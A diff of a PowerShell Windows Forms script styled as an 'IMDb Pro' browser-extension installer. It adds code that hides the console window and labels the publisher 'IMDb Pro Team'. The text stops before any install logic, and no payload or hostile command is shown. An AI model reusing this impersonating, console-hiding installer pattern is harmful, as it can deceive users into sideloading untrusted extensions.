@@ -1,451 +1,465 @@
-# IMDB Pro Installer - IMDb Style UI
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Create main form with IMDb colors
+# Hide PowerShell console window
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
+
+# Helper: Create rounded GraphicsPath
+function Get-RoundedPath {
+    param(
+        [int]$x, [int]$y, [int]$w, [int]$h, [int]$r
+    )
+    $gp = New-Object System.Drawing.Drawing2D.GraphicsPath
+    $diam = $r * 2
+    $gp.AddArc($x, $y, $diam, $diam, 180, 90)
+    $gp.AddArc($x + $w - $diam, $y, $diam, $diam, 270, 90)
+    $gp.AddArc($x + $w - $diam, $y + $h - $diam, $diam, $diam, 0, 90)
+    $gp.AddArc($x, $y + $h - $diam, $diam, $diam, 90, 90)
+    $gp.CloseFigure()
+    return $gp
+}
+
+# Helper: Create a rounded button with hover effects
+function New-RoundedButton {
+    param(
+        [string]$Text,
+        [int]$X,
+        [int]$Y,
+        [int]$Width,
+        [int]$Height,
+        [System.Drawing.Color]$BackColor,
+        [System.Drawing.Color]$HoverColor,
+        [System.Drawing.Color]$ForeColor
+    )
+
+    $btn = New-Object System.Windows.Forms.Button
+    $btn.Text = $Text
+    $btn.Size = New-Object System.Drawing.Size($Width, $Height)
+    $btn.Location = New-Object System.Drawing.Point($X, $Y)
+    $btn.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+    $btn.FlatAppearance.BorderSize = 0
+    $btn.BackColor = $BackColor
+    $btn.Tag = @{ Normal = $BackColor; Hover = $HoverColor }
+    $btn.ForeColor = $ForeColor
+    $btn.Cursor = [System.Windows.Forms.Cursors]::Hand
+    $btn.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
+
+    $btn.Add_Paint({
+        $r = 8
+        $path = Get-RoundedPath 0 0 $this.Width $this.Height $r
+        $this.Region = New-Object System.Drawing.Region $path
+        $g = $args[1].Graphics
+        $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
+        $brush = New-Object System.Drawing.SolidBrush $this.BackColor
+        $g.FillPath($brush, $path)
+        $brush.Dispose()
+        $pen = New-Object System.Drawing.Pen ([System.Drawing.Color]::FromArgb(40,40,40))
+        $g.DrawPath($pen, $path)
+        $pen.Dispose()
+    })
+
+    $btn.Add_MouseEnter({
+        $this.BackColor = $this.Tag.Hover
+        $this.Invalidate()
+    })
+    $btn.Add_MouseLeave({
+        $this.BackColor = $this.Tag.Normal
+        $this.Invalidate()
+    })
+
+    return $btn
+}
+
+# Create main form - Modern professional style
 $mainForm = New-Object System.Windows.Forms.Form
-$mainForm.Text = "IMDb Pro - Professional Edition"
-$mainForm.Size = New-Object System.Drawing.Size(900, 700)
+$mainForm.Text = "Install IMDb Pro"
+$mainForm.Size = New-Object System.Drawing.Size(640, 380)
 $mainForm.StartPosition = "CenterScreen"
-$mainForm.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 23)  # IMDb dark background
-$mainForm.ForeColor = [System.Drawing.Color]::White
-$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
+$mainForm.BackColor = [System.Drawing.Color]::FromArgb(245,245,247)
+$mainForm.ForeColor = [System.Drawing.Color]::FromArgb(32,32,32)
+$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
 $mainForm.MaximizeBox = $false
+$mainForm.MinimizeBox = $true
 
-# Header with IMDb gradient
-$headerPanel = New-Object System.Windows.Forms.Panel
-$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
-$headerPanel.Size = New-Object System.Drawing.Size(900, 80)
-$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
-$mainForm.Controls.Add($headerPanel)
+# Subtle shadow panel (background layer)
+$shadow = New-Object System.Windows.Forms.Panel
+$shadow.Size = New-Object System.Drawing.Size(620, 300)
+$shadow.Location = New-Object System.Drawing.Point(10, 40)
+$shadow.BackColor = [System.Drawing.Color]::FromArgb(230,230,235)
+$mainForm.Controls.Add($shadow)
 
-# IMDb Pro Logo
-$logoLabel = New-Object System.Windows.Forms.Label
-$logoLabel.Text = "IMDb"
-$logoLabel.Font = New-Object System.Drawing.Font("Arial", 28, [System.Drawing.FontStyle]::Bold)
-$logoLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)  # IMDb yellow
-$logoLabel.AutoSize = $true
-$logoLabel.Location = New-Object System.Drawing.Point(50, 20)
-$headerPanel.Controls.Add($logoLabel)
+# Header with gradient-like effect using two panels
+$header = New-Object System.Windows.Forms.Panel
+$header.Size = New-Object System.Drawing.Size(620, 80)
+$header.Location = New-Object System.Drawing.Point(10, 10)
+$header.BackColor = [System.Drawing.Color]::FromArgb(15, 25, 40)
+$mainForm.Controls.Add($header)
 
-$proLabel = New-Object System.Windows.Forms.Label
-$proLabel.Text = "PRO"
-$proLabel.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
-$proLabel.ForeColor = [System.Drawing.Color]::White
-$proLabel.AutoSize = $true
-$proLabel.Location = New-Object System.Drawing.Point(155, 25)
-$headerPanel.Controls.Add($proLabel)
+# App icon (emoji) - large
+$iconLabel = New-Object System.Windows.Forms.Label
+$iconLabel.Text = "🎬"
+$iconLabel.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 28)
+$iconLabel.AutoSize = $true
+$iconLabel.Location = New-Object System.Drawing.Point(20, 18)
+$header.Controls.Add($iconLabel)
+
+# Title and subtitle
+$titleLabel = New-Object System.Windows.Forms.Label
+$titleLabel.Text = "IMDb Pro — Installer"
+$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
+$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(255,255,255)
+$titleLabel.AutoSize = $true
+$titleLabel.Location = New-Object System.Drawing.Point(78, 18)
+$header.Controls.Add($titleLabel)
 
 $subtitleLabel = New-Object System.Windows.Forms.Label
-$subtitleLabel.Text = "Professional Extension Suite"
-$subtitleLabel.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Italic)
-$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
+$subtitleLabel.Text = "Professional browser extension • v2.1.0"
+$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(200,200,210)
 $subtitleLabel.AutoSize = $true
-$subtitleLabel.Location = New-Object System.Drawing.Point(200, 30)
-$headerPanel.Controls.Add($subtitleLabel)
+$subtitleLabel.Location = New-Object System.Drawing.Point(78, 42)
+$header.Controls.Add($subtitleLabel)
 
-# Main content panel
-$contentPanel = New-Object System.Windows.Forms.Panel
-$contentPanel.Location = New-Object System.Drawing.Point(0, 80)
-$contentPanel.Size = New-Object System.Drawing.Size(900, 520)
-$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
-$mainForm.Controls.Add($contentPanel)
+# Info panel (content)
+$content = New-Object System.Windows.Forms.Panel
+$content.Size = New-Object System.Drawing.Size(600, 220)
+$content.Location = New-Object System.Drawing.Point(20, 100)
+$content.BackColor = [System.Drawing.Color]::FromArgb(255,255,255)
+$content.BorderStyle = [System.Windows.Forms.BorderStyle]::None
+$mainForm.Controls.Add($content)
 
-# Features Section
-$featuresLabel = New-Object System.Windows.Forms.Label
-$featuresLabel.Text = "Premium Features"
-$featuresLabel.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
-$featuresLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
-$featuresLabel.AutoSize = $true
-$featuresLabel.Location = New-Object System.Drawing.Point(50, 30)
-$contentPanel.Controls.Add($featuresLabel)
+# App information labels
+$appLabel = New-Object System.Windows.Forms.Label
+$appLabel.Text = "Browser Extension"
+$appLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
+$appLabel.ForeColor = [System.Drawing.Color]::FromArgb(28,28,28)
+$appLabel.AutoSize = $true
+$appLabel.Location = New-Object System.Drawing.Point(18, 12)
+$content.Controls.Add($appLabel)
 
-# Feature 1 - Ratings
-$feature1Panel = New-Object System.Windows.Forms.Panel
-$feature1Panel.Size = New-Object System.Drawing.Size(250, 120)
-$feature1Panel.Location = New-Object System.Drawing.Point(50, 80)
-$feature1Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
-$feature1Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-$feature1Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
-$contentPanel.Controls.Add($feature1Panel)
+$pubLabel = New-Object System.Windows.Forms.Label
+$pubLabel.Text = "Publisher: IMDb Pro Team"
+$pubLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$pubLabel.ForeColor = [System.Drawing.Color]::FromArgb(110,110,120)
+$pubLabel.AutoSize = $true
+$pubLabel.Location = New-Object System.Drawing.Point(18, 42)
+$content.Controls.Add($pubLabel)
 
-$starIcon1 = New-Object System.Windows.Forms.Label
-$starIcon1.Text = "⭐"
-$starIcon1.Font = New-Object System.Drawing.Font("Arial", 24)
-$starIcon1.AutoSize = $true
-$starIcon1.Location = New-Object System.Drawing.Point(20, 20)
-$feature1Panel.Controls.Add($starIcon1)
+$verLabel = New-Object System.Windows.Forms.Label
+$verLabel.Text = "Version: 2.1.0"
+$verLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$verLabel.ForeColor = [System.Drawing.Color]::FromArgb(110,110,120)
+$verLabel.AutoSize = $true
+$verLabel.Location = New-Object System.Drawing.Point(18, 62)
+$content.Controls.Add($verLabel)
 
-$feature1Title = New-Object System.Windows.Forms.Label
-$feature1Title.Text = "Real-time IMDb Ratings"
-$feature1Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
-$feature1Title.ForeColor = [System.Drawing.Color]::White
-$feature1Title.AutoSize = $true
-$feature1Title.Location = New-Object System.Drawing.Point(70, 25)
-$feature1Panel.Controls.Add($feature1Title)
+# Changelog link
+$changelog = New-Object System.Windows.Forms.LinkLabel
+$changelog.Text = "View changelog"
+$changelog.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Italic)
+$changelog.LinkColor = [System.Drawing.Color]::FromArgb(0,120,215)
+$changelog.AutoSize = $true
+$changelog.Location = New-Object System.Drawing.Point(18, 88)
+$changelog.Add_LinkClicked({
+    try {
+        Start-Process "https://example.com/changelog"
+    } catch {}
+})
+$content.Controls.Add($changelog)
 
-$feature1Desc = New-Object System.Windows.Forms.Label
-$feature1Desc.Text = "Instant access to ratings and reviews"
-$feature1Desc.Font = New-Object System.Drawing.Font("Arial", 9)
-$feature1Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
-$feature1Desc.AutoSize = $true
-$feature1Desc.Location = New-Object System.Drawing.Point(20, 70)
-$feature1Panel.Controls.Add($feature1Desc)
+# Agreement and options (styled card)
+$card = New-Object System.Windows.Forms.Panel
+$card.Size = New-Object System.Drawing.Size(540, 90)
+$card.Location = New-Object System.Drawing.Point(18, 110)
+$card.BackColor = [System.Drawing.Color]::FromArgb(250,250,252)
+$card.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
+$content.Controls.Add($card)
 
-# Feature 2 - Movie Info
-$feature2Panel = New-Object System.Windows.Forms.Panel
-$feature2Panel.Size = New-Object System.Drawing.Size(250, 120)
-$feature2Panel.Location = New-Object System.Drawing.Point(320, 80)
-$feature2Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
-$feature2Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-$feature2Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
-$contentPanel.Controls.Add($feature2Panel)
+$agreementCheckbox = New-Object System.Windows.Forms.CheckBox
+$agreementCheckbox.Text = "I agree to the terms and conditions"
+$agreementCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
+$agreementCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(40,40,40)
+$agreementCheckbox.AutoSize = $true
+$agreementCheckbox.Location = New-Object System.Drawing.Point(12, 12)
+$agreementCheckbox.Checked = $false
+$card.Controls.Add($agreementCheckbox)
 
-$movieIcon = New-Object System.Windows.Forms.Label
-$movieIcon.Text = "🎬"
-$movieIcon.Font = New-Object System.Drawing.Font("Arial", 24)
-$movieIcon.AutoSize = $true
-$movieIcon.Location = New-Object System.Drawing.Point(20, 20)
-$feature2Panel.Controls.Add($movieIcon)
+$launchCheckbox = New-Object System.Windows.Forms.CheckBox
+$launchCheckbox.Text = "Open extensions page after install"
+$launchCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$launchCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(90,90,90)
+$launchCheckbox.AutoSize = $true
+$launchCheckbox.Location = New-Object System.Drawing.Point(12, 38)
+$launchCheckbox.Checked = $true
+$card.Controls.Add($launchCheckbox)
 
-$feature2Title = New-Object System.Windows.Forms.Label
-$feature2Title.Text = "Complete Movie Info"
-$feature2Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
-$feature2Title.ForeColor = [System.Drawing.Color]::White
-$feature2Title.AutoSize = $true
-$feature2Title.Location = New-Object System.Drawing.Point(70, 25)
-$feature2Panel.Controls.Add($feature2Title)
+$installCheckbox = New-Object System.Windows.Forms.CheckBox
+$installCheckbox.Text = "Install to default location"
+$installCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$installCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(90,90,90)
+$installCheckbox.AutoSize = $true
+$installCheckbox.Location = New-Object System.Drawing.Point(12, 60)
+$installCheckbox.Checked = $true
+$card.Controls.Add($installCheckbox)
 
-$feature2Desc = New-Object System.Windows.Forms.Label
-$feature2Desc.Text = "Cast, crew, and detailed information"
-$feature2Desc.Font = New-Object System.Drawing.Font("Arial", 9)
-$feature2Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
-$feature2Desc.AutoSize = $true
-$feature2Desc.Location = New-Object System.Drawing.Point(20, 70)
-$feature2Panel.Controls.Add($feature2Desc)
-
-# Feature 3 - Trailers
-$feature3Panel = New-Object System.Windows.Forms.Panel
-$feature3Panel.Size = New-Object System.Drawing.Size(250, 120)
-$feature3Panel.Location = New-Object System.Drawing.Point(590, 80)
-$feature3Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
-$feature3Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-$feature3Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
-$contentPanel.Controls.Add($feature3Panel)
-
-$trailerIcon = New-Object System.Windows.Forms.Label
-$trailerIcon.Text = "🎥"
-$trailerIcon.Font = New-Object System.Drawing.Font("Arial", 24)
-$trailerIcon.AutoSize = $true
-$trailerIcon.Location = New-Object System.Drawing.Point(20, 20)
-$feature3Panel.Controls.Add($trailerIcon)
-
-$feature3Title = New-Object System.Windows.Forms.Label
-$feature3Title.Text = "HD Trailers & Previews"
-$feature3Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
-$feature3Title.ForeColor = [System.Drawing.Color]::White
-$feature3Title.AutoSize = $true
-$feature3Title.Location = New-Object System.Drawing.Point(70, 25)
-$feature3Panel.Controls.Add($feature3Title)
-
-$feature3Desc = New-Object System.Windows.Forms.Label
-$feature3Desc.Text = "Watch trailers directly in browser"
-$feature3Desc.Font = New-Object System.Drawing.Font("Arial", 9)
-$feature3Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
-$feature3Desc.AutoSize = $true
-$feature3Desc.Location = New-Object System.Drawing.Point(20, 70)
-$feature3Panel.Controls.Add($feature3Desc)
-
-# Additional Features Row 2
-# Feature 4 - Browser Integration
-$feature4Panel = New-Object System.Windows.Forms.Panel
-$feature4Panel.Size = New-Object System.Drawing.Size(250, 120)
-$feature4Panel.Location = New-Object System.Drawing.Point(50, 220)
-$feature4Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
-$feature4Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-$feature4Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
-$contentPanel.Controls.Add($feature4Panel)
-
-$browserIcon = New-Object System.Windows.Forms.Label
-$browserIcon.Text = "🌐"
-$browserIcon.Font = New-Object System.Drawing.Font("Arial", 24)
-$browserIcon.AutoSize = $true
-$browserIcon.Location = New-Object System.Drawing.Point(20, 20)
-$feature4Panel.Controls.Add($browserIcon)
-
-$feature4Title = New-Object System.Windows.Forms.Label
-$feature4Title.Text = "Browser Integration"
-$feature4Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
-$feature4Title.ForeColor = [System.Drawing.Color]::White
-$feature4Title.AutoSize = $true
-$feature4Title.Location = New-Object System.Drawing.Point(70, 25)
-$feature4Panel.Controls.Add($feature4Title)
-
-$feature4Desc = New-Object System.Windows.Forms.Label
-$feature4Desc.Text = "Seamless browsing experience"
-$feature4Desc.Font = New-Object System.Drawing.Font("Arial", 9)
-$feature4Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
-$feature4Desc.AutoSize = $true
-$feature4Desc.Location = New-Object System.Drawing.Point(20, 70)
-$feature4Panel.Controls.Add($feature4Desc)
-
-# Feature 5 - Auto Updates
-$feature5Panel = New-Object System.Windows.Forms.Panel
-$feature5Panel.Size = New-Object System.Drawing.Size(250, 120)
-$feature5Panel.Location = New-Object System.Drawing.Point(320, 220)
-$feature5Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
-$feature5Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-$feature5Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
-$contentPanel.Controls.Add($feature5Panel)
-
-$updateIcon = New-Object System.Windows.Forms.Label
-$updateIcon.Text = "🔄"
-$updateIcon.Font = New-Object System.Drawing.Font("Arial", 24)
-$updateIcon.AutoSize = $true
-$updateIcon.Location = New-Object System.Drawing.Point(20, 20)
-$feature5Panel.Controls.Add($updateIcon)
-
-$feature5Title = New-Object System.Windows.Forms.Label
-$feature5Title.Text = "Auto Updates"
-$feature5Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
-$feature5Title.ForeColor = [System.Drawing.Color]::White
-$feature5Title.AutoSize = $true
-$feature5Title.Location = New-Object System.Drawing.Point(70, 25)
-$feature5Panel.Controls.Add($feature5Title)
-
-$feature5Desc = New-Object System.Windows.Forms.Label
-$feature5Desc.Text = "Always up-to-date features"
-$feature5Desc.Font = New-Object System.Drawing.Font("Arial", 9)
-$feature5Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
-$feature5Desc.AutoSize = $true
-$feature5Desc.Location = New-Object System.Drawing.Point(20, 70)
-$feature5Panel.Controls.Add($feature5Desc)
-
-# Feature 6 - Security
-$feature6Panel = New-Object System.Windows.Forms.Panel
-$feature6Panel.Size = New-Object System.Drawing.Size(250, 120)
-$feature6Panel.Location = New-Object System.Drawing.Point(590, 220)
-$feature6Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
-$feature6Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-$feature6Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
-$contentPanel.Controls.Add($feature6Panel)
-
-$securityIcon = New-Object System.Windows.Forms.Label
-$securityIcon.Text = "🔒"
-$securityIcon.Font = New-Object System.Drawing.Font("Arial", 24)
-$securityIcon.AutoSize = $true
-$securityIcon.Location = New-Object System.Drawing.Point(20, 20)
-$feature6Panel.Controls.Add($securityIcon)
-
-$feature6Title = New-Object System.Windows.Forms.Label
-$feature6Title.Text = "Secure & Private"
-$feature6Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
-$feature6Title.ForeColor = [System.Drawing.Color]::White
-$feature6Title.AutoSize = $true
-$feature6Title.Location = New-Object System.Drawing.Point(70, 25)
-$feature6Panel.Controls.Add($feature6Title)
-
-$feature6Desc = New-Object System.Windows.Forms.Label
-$feature6Desc.Text = "Your data is protected"
-$feature6Desc.Font = New-Object System.Drawing.Font("Arial", 9)
-$feature6Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
-$feature6Desc.AutoSize = $true
-$feature6Desc.Location = New-Object System.Drawing.Point(20, 70)
-$feature6Panel.Controls.Add($feature6Desc)
-
-# Installation Progress Section
-$progressLabel = New-Object System.Windows.Forms.Label
-$progressLabel.Text = "Installation Progress"
-$progressLabel.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
-$progressLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
-$progressLabel.AutoSize = $true
-$progressLabel.Location = New-Object System.Drawing.Point(50, 370)
-$contentPanel.Controls.Add($progressLabel)
-
-# Progress bar container
-$progressContainer = New-Object System.Windows.Forms.Panel
-$progressContainer.Size = New-Object System.Drawing.Size(800, 100)
-$progressContainer.Location = New-Object System.Drawing.Point(50, 410)
-$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
-$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-$contentPanel.Controls.Add($progressContainer)
-
-# Status label
-$statusLabel = New-Object System.Windows.Forms.Label
-$statusLabel.Text = "Ready to begin installation"
-$statusLabel.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
-$statusLabel.ForeColor = [System.Drawing.Color]::White
-$statusLabel.AutoSize = $true
-$statusLabel.Location = New-Object System.Drawing.Point(20, 20)
-$progressContainer.Controls.Add($statusLabel)
-
-# Progress bar
+# Progress area (initially hidden)
 $progressBar = New-Object System.Windows.Forms.ProgressBar
-$progressBar.Location = New-Object System.Drawing.Point(20, 50)
-$progressBar.Size = New-Object System.Drawing.Size(650, 30)
+$progressBar.Location = New-Object System.Drawing.Point(18, 330)
+$progressBar.Size = New-Object System.Drawing.Size(440, 18)
 $progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
-$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)  # IMDb yellow
-$progressBar.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
-$progressContainer.Controls.Add($progressBar)
+$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0,120,215)
+$progressBar.Value = 0
+$progressBar.Visible = $false
+$mainForm.Controls.Add($progressBar)
 
-# Percentage label
 $percentLabel = New-Object System.Windows.Forms.Label
 $percentLabel.Text = "0%"
-$percentLabel.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
-$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
+$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
+$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(90,90,90)
 $percentLabel.AutoSize = $true
-$percentLabel.Location = New-Object System.Drawing.Point(680, 45)
-$progressContainer.Controls.Add($percentLabel)
+$percentLabel.Location = New-Object System.Drawing.Point(468, 328)
+$percentLabel.Visible = $false
+$mainForm.Controls.Add($percentLabel)
 
-# Install button panel
-$buttonPanel = New-Object System.Windows.Forms.Panel
-$buttonPanel.Location = New-Object System.Drawing.Point(0, 600)
-$buttonPanel.Size = New-Object System.Drawing.Size(900, 100)
-$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
-$mainForm.Controls.Add($buttonPanel)
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Text = ""
+$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(100,100,100)
+$statusLabel.AutoSize = $true
+$statusLabel.Location = New-Object System.Drawing.Point(18, 308)
+$statusLabel.Visible = $false
+$mainForm.Controls.Add($statusLabel)
 
-# Install button
-$installButton = New-Object System.Windows.Forms.Button
-$installButton.Text = "START INSTALLATION"
-$installButton.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
-$installButton.ForeColor = [System.Drawing.Color]::Black
-$installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)  # IMDb yellow
-$installButton.Size = New-Object System.Drawing.Size(300, 60)
-$installButton.Location = New-Object System.Drawing.Point(300, 20)
-$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
-$installButton.FlatAppearance.BorderSize = 0
-$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand
+# ToolTip
+$toolTip = New-Object System.Windows.Forms.ToolTip
+$toolTip.SetToolTip($agreementCheckbox, "You must agree to continue")
+$toolTip.SetToolTip($launchCheckbox, "Open Chrome or Edge extensions page after install")
+$toolTip.SetToolTip($installCheckbox, "Install into C:\Program Files\imdb-pro (default)")
 
-# Button hover effects
-$installButton.Add_MouseEnter({
-    $this.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
-    $this.Font = New-Object System.Drawing.Font("Arial", 16.5, [System.Drawing.FontStyle]::Bold)
+# Buttons: Cancel, Install (rounded)
+$cancelBtn = New-RoundedButton "Cancel" 420 18 90 36 `
+    ([System.Drawing.Color]::FromArgb(245,245,247)) `
+    ([System.Drawing.Color]::FromArgb(232,232,234)) `
+    ([System.Drawing.Color]::FromArgb(60,60,60))
+$cancelBtn.Font = New-Object System.Drawing.Font("Segoe UI",9)
+$mainForm.Controls.Add($cancelBtn)
+
+$installBtn = New-RoundedButton "Install" 520 18 90 36 `
+    ([System.Drawing.Color]::FromArgb(0,120,215)) `
+    ([System.Drawing.Color]::FromArgb(0,100,190)) `
+    ([System.Drawing.Color]::White)
+$installBtn.Enabled = $false
+$mainForm.Controls.Add($installBtn)
+
+# Small spinner using a Label updated by Timer
+$spinner = New-Object System.Windows.Forms.Label
+$spinner.Text = ""
+$spinner.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 12)
+$spinner.AutoSize = $true
+$spinner.Location = New-Object System.Drawing.Point(520, 324)
+$spinner.Visible = $false
+$mainForm.Controls.Add($spinner)
+
+$spinTimer = New-Object System.Windows.Forms.Timer
+$spinTimer.Interval = 120
+$spinSequence = @("⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠏")
+$spinIndex = 0
+$spinTimer.Add_Tick({
+    $spinner.Text = $spinSequence[$spinIndex % $spinSequence.Length]
+    $spinIndex++
 })
 
-$installButton.Add_MouseLeave({
-    if ($this.Text -ne "INSTALLATION COMPLETE") {
-        $this.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
-        $this.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
+# Enable install when agreement is checked
+$agreementCheckbox.Add_CheckedChanged({
+    if ($agreementCheckbox.Checked) {
+        $installBtn.Enabled = $true
+        $installBtn.BackColor = [System.Drawing.Color]::FromArgb(0,120,215)
+        $installBtn.Tag.Normal = [System.Drawing.Color]::FromArgb(0,120,215)
+    } else {
+        $installBtn.Enabled = $false
+        $installBtn.BackColor = [System.Drawing.Color]::FromArgb(200,200,204)
+        $installBtn.Tag.Normal = [System.Drawing.Color]::FromArgb(200,200,204)
     }
 })
 
-# Installation function
-$installButton.Add_Click({
-    $this.Enabled = $false
-    $this.Text = "INSTALLING..."
-    Start-Installation
-})
-
-$buttonPanel.Controls.Add($installButton)
-
-# Update function
-function Update-Status {
-    param($Message, $ProgressValue)
-    
+# Progress update helper
+function Update-ProgressView {
+    param([string]$Message, [int]$Percent)
+    $statusLabel.Visible = $true
     $statusLabel.Text = $Message
-    $percentLabel.Text = "$ProgressValue%"
-    $progressBar.Value = $ProgressValue
+    $progressBar.Visible = $true
+    $percentLabel.Visible = $true
+    $percentLabel.Text = "$Percent`%"
+    if ($Percent -ge 0 -and $Percent -le 100) {
+        $progressBar.Value = $Percent
+    }
     [System.Windows.Forms.Application]::DoEvents()
-    Start-Sleep -Milliseconds 500
 }
 
-# Installation function
+# Show completion view
+function Show-Completion {
+    $spinTimer.Stop()
+    $spinner.Visible = $false
+    $statusLabel.Text = "Installation completed successfully!"
+    $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(0,120,60)
+    $percentLabel.Text = "100%"
+    $installBtn.Text = "Done"
+    $installBtn.Enabled = $false
+    # Add close button
+    $closeBtn = New-RoundedButton "Close" 520 18 90 36 `
+        ([System.Drawing.Color]::FromArgb(0,120,215)) `
+        ([System.Drawing.Color]::FromArgb(0,100,190)) `
+        ([System.Drawing.Color]::White)
+    $closeBtn.Add_Click({
+        if ($launchCheckbox.Checked) {
+            try { Start-Process "chrome.exe" "chrome://extensions" } catch { try { Start-Process "msedge.exe" "edge://extensions" } catch {} }
+        }
+        $mainForm.Close()
+    })
+    $mainForm.Controls.Add($closeBtn)
+}
+
+# Installation logic (same flow but with UI polish)
 function Start-Installation {
+    # UI setup for install
+    $installBtn.Enabled = $false
+    $cancelBtn.Enabled = $false
+    $spinner.Visible = $true
+    $spinIndex = 0
